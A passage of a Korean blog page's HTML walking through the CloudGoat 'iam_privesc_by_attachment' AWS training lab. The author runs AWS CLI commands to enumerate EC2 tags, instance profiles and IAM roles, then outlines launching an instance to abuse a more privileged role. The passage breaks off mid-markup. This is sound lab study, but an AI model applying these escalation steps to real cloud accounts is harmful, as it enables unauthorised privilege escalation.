url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABg0lEQVQoz1WR3XKaYBCGMTE2qT8oioYfIcgHChgBjYMxiK02babtUXoBvYPe/9nT8cvEaQ+eeXdP3t13V7lPt4zdOfpIYNozLMmUu8nirfcSXJHiTBaE0we0roPatmh1LJptk5vmLbXLLhf1nlSl2BzYbI+U1Qu76hsP5Qv35Xfy5RPe3Zy5FrFx1kSjkLEp0HQP/VZgWFNsJ5ZDrz4MzqbK4fiDfPVEMM1IkiUi3zHKD0RxjudGPNYDvjRTkvqIQWtA40anca3LzU5btlVL9mfDKCnw/ExOMu2IIFySxGsWWYk7WdAzBS3dpW+GGHYkjZRaB+VCfdNa5//I6+KI56cywglfZHj+AhEusZyYjuagDT0Zta9PuP44RPnH4F3fUdK8JJyt8IMcP8iI0y2zbEe2LBFBxlgThEaCMxQYhqDZMaVJvdGXXF5pZ2TkXfWVYrOnrJ7ZPu7JP/3E+/xKtX9mtz3y2z3yJ3nlV1CwilLaXRu159A/PWfkow08WbdVW973Lxiqvkr85GspAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"5\"\n        title=\"5\"\n        src=\"/static/a653e43979712bfe1e9a5076a43c00d2/37523/5.png\"\n        srcset=\"/static/a653e43979712bfe1e9a5076a43c00d2/e9ff0/5.png 180w,\n/static/a653e43979712bfe1e9a5076a43c00d2/f21e7/5.png 360w,\n/static/a653e43979712bfe1e9a5076a43c00d2/37523/5.png 720w,\n/static/a653e43979712bfe1e9a5076a43c00d2/636c2/5.png 911w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 52.222222222222214%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAAsTAAALEwEAmpwYAAABm0lEQVQoz22Sy27bMBBF8//LAC3yDwW6b1dBs8imQDdpF61lUS9SpCyLEl962bcY2grS1AQuiCFHh3NndHc6nUAruAGPPzt8eJrx8M3h/jHg83eNg6pRcQEuBOpagnMBIWpIKePZoW1xPp0jw3uPuw3YdR3SlKEqCuQsRZ4x8KpEUZTYJXvsGUNVVUiSPZIkRVlxpIxBSoVt/QM0xkLUNfp+gO57HI8dBmMwDAOMtbDOwTiP3jgMxqLTGm3bou8NzucbFfoQ4kcUr+uKdd32i5ZlweIHrK7DMlos1/NpmvDKeAukC3kQKFWOXDJkMkVWpyhUhvrIIZoS5fMnsK8fUfz4An5sIRoBqVSE/wcMIUTL1OhNgnbOozXnPawPFzkf3cQ2GPMeePE/zXPsF/UvhDEmd52G1hpN08D7EF2M43jVFGMq5KZlSqoqHqfqrINqGuySFIKLOFka0DzPMW+6QjfgegtIF2VZgmU5rLVQSuH3n1184OXlF7TusWzAaXrVDeDFMr1OvweJkqhnVBXBqRWUTLDwRhT7d5b/AkdH/F4AAiZsAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"6\"\n        title=\"6\"\n        src=\"/static/bdd69477c9fdf17136fd8ea7833a8072/37523/6.png\"\n        srcset=\"/static/bdd69477c9fdf17136fd8ea7833a8072/e9ff0/6.png 180w,\n/static/bdd69477c9fdf17136fd8ea7833a8072/f21e7/6.png 360w,\n/static/bdd69477c9fdf17136fd8ea7833a8072/37523/6.png 720w,\n/static/bdd69477c9fdf17136fd8ea7833a8072/f4b77/6.png 770w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">aws ec2 describe-instances --query <span class=\"token string\">'Reservations[*].Instances[*].[Tags]'</span> <span class=\"token punctuation\">\\</span>\n--profile kerrigan</code></pre></div>\n<ul>\n<li>aws cli 기능에는 <code class=\"language-text\">query</code> 옵션을 통해서 출력 형식 json 배열의 모든 출력값을 필터링 할 수 있습니다. <code class=\"language-text\">Reservations[*].Instances[*].[Tags]</code> 형태로 <code class=\"language-text\">*</code> 와일드카드 형태로 표현식을 작성할 수 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\"><span class=\"token punctuation\">[</span>\n    <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">[</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Name\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"ec2-vulnerable-proxy-server-cloud_breach_s3_cgid63w57aulmi\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Scenario\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"cloud-breach-s3\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Stack\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat\"</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">]</span>\n        <span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">[</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Scenario\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"iam-privesc-by-attachment\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Stack\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Name\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat iam_privesc_by_attachment_cgidmbi301d8zu super-critical-security-server EC2 Instance\"</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">]</span>\n<span class=\"token operator\">:</span>...skipping...\n<span class=\"token punctuation\">[</span>\n    <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">[</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Name\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"ec2-vulnerable-proxy-server-cloud_breach_s3_cgid63w57aulmi\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Scenario\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"cloud-breach-s3\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Stack\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat\"</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">]</span>\n        <span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">[</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Scenario\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"iam-privesc-by-attachment\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Stack\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Name\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat iam_privesc_by_attachment_cgidmbi301d8zu super-critical-security-server EC2 Instance\"</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">]</span>\n        <span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">[</span>...skipping...\n    <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">[</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Name\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"ec2-vulnerable-proxy-server-cloud_breach_s3_cgid63w57aulmi\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Scenario\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"cloud-breach-s3\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Stack\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat\"</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">]</span>\n        <span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">[</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Scenario\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"iam-privesc-by-attachment\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Stack\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Name\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat iam_privesc_by_attachment_cgidmbi301d8zu super-critical-security-server EC2 Instance\"</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">]</span>\n        <span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">]</span>\n<span class=\"token operator\">:</span>...skipping...\n<span class=\"token punctuation\">[</span>\n    <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">[</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Name\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"ec2-vulnerable-proxy-server-cloud_breach_s3_cgid63w57aulmi\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Scenario\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"cloud-breach-s3\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Stack\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat\"</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">]</span>\n        <span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">[</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Scenario\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"iam-privesc-by-attachment\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Stack\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Name\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat iam_privesc_by_attachment_cgidmbi301d8zu super-critical-security-server EC2 Instance\"</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">]</span>\n        <span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">]</span>\n<span class=\"token operator\">:</span>...skipping...\n<span class=\"token punctuation\">[</span>\n    <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">[</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Name\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"ec2-vulnerable-proxy-server-cloud_breach_s3_cgid63w57aulmi\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Scenario\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"cloud-breach-s3\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Stack\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat\"</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">]</span>\n        <span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">[</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Scenario\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"iam-privesc-by-attachment\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Stack\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Name\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat iam_privesc_by_attachment_cgidmbi301d8zu super-critical-security-server EC2 Instance\"</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">]</span>\n        <span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">]</span></code></pre></div>\n<ul>\n<li>해당 정보를 통해서 <code class=\"language-text\">cg-super-critical-security-server</code> 가 사용하다는 것을 알 수 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\">super-critical-security-server</code></pre></div>\n<ul>\n<li>IAM 사용자 “Kerrigan” 으로서 우리는 EC2 “Instance Profile” 과 관련된 정보를 검색할 수 가 있습니다.</li>\n<li>인스턴스 프로파일은 Single IAM Rule Container입니다.</li>\n<li>EC2 인스턴스에 IAM Rule을 직접 할당할 수 는 없지만 Rule이 포함된 인스턴스 프로파일은 할당할 수 있습니다.</li>\n<li>사용 가능한 인스턴스 프로필등을 나열하여 확인해보았습니다.  아래의 명령을 통해 cloudgoat가 규칙으로 모든 리소스의 이름을 다음으로 <code class=\"language-text\">--query</code> 로 <code class=\"language-text\">cg</code> 로 시작하는 인스턴스 Rule을 쿼리하였습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\">aws iam list-instance-profiles --query <span class=\"token string\">\"InstanceProfiles[?starts_with(InstanceProfileName, 'cg')]\"</span> --profile kerrigan\n\nInstanceProfileName -> (문자열)\n\n인스턴스 프로파일을 식별하는 이름입니다.</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 50.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAAsTAAALEwEAmpwYAAABf0lEQVQoz31S147CQBBbeieEkEYIJRBK6AcIOF17uf//JJ88YRFI6B6sWW3GE9s7KggXyBctDEZrgePHMK0hao0u2p0ROk4kaLUHaLZ6dzSMFIYZwjD7sOwIpYoDFQ4SVOs+ev0E43iP1eYd08UR8eyAze4Dy80Vy/UFw2gjg213AtePYbtjgT6zlqsuVLc3R7MVYvf2hcXqLIPnyUkGWPborrJY7qBQegadETwXyzZyhTaU7URQqopKzYVpDYRMxWzgHzVIJCGbN6USerDKGlCqnlavO71Pp3QqjSY7bPefYv9w+sH++I3+cCXqmTO/S413ciYvzdBOM2x3hnC8iagjyQtmYBSj8VaIXncG15+KA/5YW9WgID7Ig+UalGrIRbK64Hz9lQfiw/DVSaA1IWQNZHKtJ4jV271yvDFUxrg1px+ZmR/MRLFeB50ZFZHILF9Bud4ESjXvF7o56CeSD9chRWq5UvP+H8jFfBzESjVcWobMBeeis0/b0n2vBv8B5gL2x5a+cc4AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"7\"\n        title=\"7\"\n        src=\"/static/e3af4801ac89e6d317ae252a6e2c46e1/37523/7.png\"\n        srcset=\"/static/e3af4801ac89e6d317ae252a6e2c46e1/e9ff0/7.png 180w,\n/static/e3af4801ac89e6d317ae252a6e2c46e1/f21e7/7.png 360w,\n/static/e3af4801ac89e6d317ae252a6e2c46e1/37523/7.png 720w,\n/static/e3af4801ac89e6d317ae252a6e2c46e1/cc488/7.png 928w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\"><span class=\"token property\">\"InstanceProfileName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"cg-ec2-meek-instance-profile-iam_privesc_by_attachment_cgidmbi301d8zu\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token property\">\"RoleName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"cg-ec2-meek-role-iam_privesc_by_attachment_cgidmbi301d8zu\"</span><span class=\"token punctuation\">,</span></code></pre></div>\n<ul>\n<li>AWS 게정에는 <code class=\"language-text\">cg-ec2-meek-instance-profile-[CLOUD_GOAT_ID]</code> , <code class=\"language-text\">cg-ec2-meek-role-[CLOUD_GOAT_ID]</code> 형태의 패턴으로 IAM Rule에 대한 정보를 확인할 수있습니다.</li>\n<li>IAM 사용자 kerrigan으로서 IAM Rule과 관련된 정보를 검색할수도 있습니다. 해당 부분에서 사용할 수 있는 IAM 역활들을 나열해 봤습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\">aws iam list-roles --query <span class=\"token string\">\"Roles[?starts_with(RoleName, 'cg')]\"</span> --profile kerrigan</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 70%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB10lEQVQ4y41T127jMBCkUlwl0VaX5SJZ7jUNuMQH5DH//0cTzMqUU+6CPCxIguLszOxIKctFqxNjvf2DNFvBDwsEcYkwnsle98ewdQZHD9HzxnB7I/T9HEE0he0OoJQDZWkQx7ruQRGMj8r5PQbDFTa7ZyzWT9gdT7h/fEVeHpAMFojTuVSYzOozQf1wWjdotiModiaTxeoJm/0z8ukB++NJQKPz4yAqcdsMcNPwv1WjFaLRCmS9vvWg1JUW2pSz3b9gNNkiSubo+xN5IJJEViXpa8n7q2qtzjd9sHjgmmZLTIo9kmwpflFGx07FZ/PtT6UMmAGkH9loLd5QMvdkT9BfARogMqFPXWcg+1YnksmyjLT/gRiMmmG7myCMS3hhIQy7TiqsKn/tD/7oS1n6n01qQErzghwdO5F8kSn3vKN/nGK7G9fn6j49N3UvOSSg7WbYHU4YjjeyMuTM4d3DqwyImWNGec9hsTnTwJVpoBpWsx1C9byJfFiUR4zznXw0WzxgOrtDOlzJmcMhK8OUHrMq1okwpZoqZmc/CPby902A5stHASIAu3JYn/z7Wmc/a8mysbR05J9BL8mc3Y03v4mMDIXdLxPScHQGLyjEdN4ZsI9Z/QnwHYWuToIOK7dhAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"8\"\n        title=\"8\"\n        src=\"/static/aa89ce317f2ef72519163ed73e63236d/37523/8.png\"\n        srcset=\"/static/aa89ce317f2ef72519163ed73e63236d/e9ff0/8.png 180w,\n/static/aa89ce317f2ef72519163ed73e63236d/f21e7/8.png 360w,\n/static/aa89ce317f2ef72519163ed73e63236d/37523/8.png 720w,\n/static/aa89ce317f2ef72519163ed73e63236d/c0255/8.png 920w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>AWS 두 IAM Rule 계정을 확인할 수 가 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\">cg-ec2-meek-role-iam_privesc_by_attachment_cgidmbi301d8zu\n\ncg-ec2-mighty-role-iam_privesc_by_attachment_cgidmbi301d8zu</code></pre></div>\n<ul>\n<li>RoleName에서 확인할 수 있듯이 meek, mighty 키워드를 통해 권한 레벨을 확인할 수 가 있습니다. 뜻 그대로 meek &#x3C; mighty 레벨 입니다. 이러한 권한 으로 인해 접근 제한이 되어 액세스 거부 문제가 발생할 수 있습니다.</li>\n</ul>\n<h3 id=\"권한-역활을-파악하는-방법\" style=\"position:relative;\"><a href=\"#%EA%B6%8C%ED%95%9C-%EC%97%AD%ED%99%9C%EC%9D%84-%ED%8C%8C%EC%95%85%ED%95%98%EB%8A%94-%EB%B0%A9%EB%B2%95\" aria-label=\"권한 역활을 파악하는 방법 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>권한 역활을 파악하는 방법</h3>\n<ul>\n<li>EC2 인스턴스에 연결하고 EC2를 사용하여 역할 권한을 열거하는 것입니다.</li>\n<li>IAM 역할은 EC2에 직접 연결할 수 없으며 인스턴스 프로파일에 Wrapping되어야 합니다.</li>\n<li>해당 방법을 사용하려면 AWS 계정의 인스턴스 프로필을 사용하여 EC2 인스턴스를 생성할 수 있어야 합니다.</li>\n<li>EC2 인스턴스를 생성을 하기 전에 필요한 데이터가 있어야 합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\"><span class=\"token number\">1</span>. EC2 Instance 를 시작할 subnet\n<span class=\"token number\">2</span>. EC2 Instance에 대한 SSH 액세스를 허용하는 보안 그룹\n<span class=\"token number\">3</span>. EC2 Instance에 SSH로 연결하는데 사용할 수 있는 SSH key-pair\n\n-> 삭제 대상 EC2 머신과 동일한 Subnet을 사용할 수 있습니다.\nsubnet-04d05182b53c1ff11</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 21.666666666666668%; position: relative; bottom: 0; left: 0; background-image: 